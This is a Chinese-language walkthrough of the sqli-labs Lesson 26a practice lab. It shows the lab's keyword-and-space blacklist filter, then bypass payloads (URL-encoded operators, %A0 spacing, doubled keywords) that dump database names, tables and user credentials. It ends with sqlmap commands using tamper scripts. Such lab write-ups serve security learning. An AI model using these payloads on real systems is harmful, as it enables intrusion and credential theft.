---
title: sqli-labs lession-26a GET基于错误-你的空格和注释归我所有-字符型-括号
date: 2018-10-06 12:48:17
tags: [sqli-labs]
categories: sql注入
---

# sqli-labs lession-26a GET基于错误-你的空格和注释归我所有-字符型-括号

---

## 登录界面

![001](/img/sql/Lesson-26a/001.png)

## 手注

```
function blacklist($id)
{
	$id= preg_replace('/or/i',"", $id);			//strip out OR (non case sensitive)
	$id= preg_replace('/and/i',"", $id);		//Strip out AND (non case sensitive)
	$id= preg_replace('/[\/\*]/',"", $id);		//strip out /*
	$id= preg_replace('/[--]/',"", $id);		//Strip out --
	$id= preg_replace('/[#]/',"", $id);			//Strip out #
	$id= preg_replace('/[\s]/',"", $id);		//Strip out spaces
	$id= preg_replace('/[\s]/',"", $id);		//Strip out spaces
	$id= preg_replace('/[\/\\\\]/',"", $id);		//Strip out slashes
	return $id;
}
```

和Lesson-26一样过滤了or,and,/,*,#,空格,\。过滤方式没有变化。但是这里不能利用报错注入了。

### 判断类型

`http://192.168.75.132/sql/Less-26a/?id=2')%26%26('1`

使用了`（''）`进行闭合。

![002](/img/sql/Lesson-26a/002.png)

### 获取列数

`http://192.168.75.132/sql/Less-26a/?id=1'%26%261=2)union%A0select%A01,2,3%7c%7c('1`

![003](/img/sql/Lesson-26a/003.png)

### 获取数据库名

`http://192.168.75.132/sql/Less-26a/?id=1'%26%261=2)union%A0select%A01,(database()),3%7c%7c('1`

![004](/img/sql/Lesson-26a/004.png)

### 获取表名

`http://192.168.75.132/sql/Less-26a/?id=1'%26%261=2)union%A0select(1),(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema='security')),3%7c%7c('1`

![005](/img/sql/Lesson-26a/005.png)

### 获取列名

`http://192.168.75.132/sql/Less-26a/?id=1'%26%261=2)union%A0select(1),(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name='users')),3%7c%7c('1`

![006](/img/sql/Lesson-26a/006.png)

### 获取字段

`http://192.168.75.132/sql/Less-26a/?id=1'%26%261=2)union%A0select(1),(select(group_concat(id,'~',username,'~',passwoorrd))from(security.users)),3%7c%7c('1`

![007](/img/sql/Lesson-26a/007.png)

## SQLMAP

拿直接的绕过脚本直接用就可以了。

`python sqlmap.py -u "http://192.168.75.132/sql/Less-26a/?id=1" --threads 10  --dbms mysql --tamper "andor.py,space0A.py,count.py" --fresh-queries --flush-session`

![008](/img/sql/Lesson-26a/008.png)

![009](/img/sql/Lesson-26a/009.png)

`python sqlmap.py -u "http://192.168.75.132/sql/Less-26a/?id=1" --threads 10  --dbms mysql --tamper "andor.py,space0A.py,count.py" --dbs`

![010](/img/sql/Lesson-26a/010.png)

![011](/img/sql/Lesson-26a/011.png)

`python sqlmap.py -u "http://192.168.75.132/sql/Less-26a/?id=1" --threads 10  --dbms mysql --tamper "andor.py,space0A.py,count.py" -D security --tables`

![012](/img/sql/Lesson-26a/012.png)

`python sqlmap.py -u "http://192.168.75.132/sql/Less-26a/?id=1" --threads 10  --dbms mysql --tamper "andor.py,space0A.py,count.py" -D security -T users --columns --dump`

![013](/img/sql/Lesson-26a/013.png)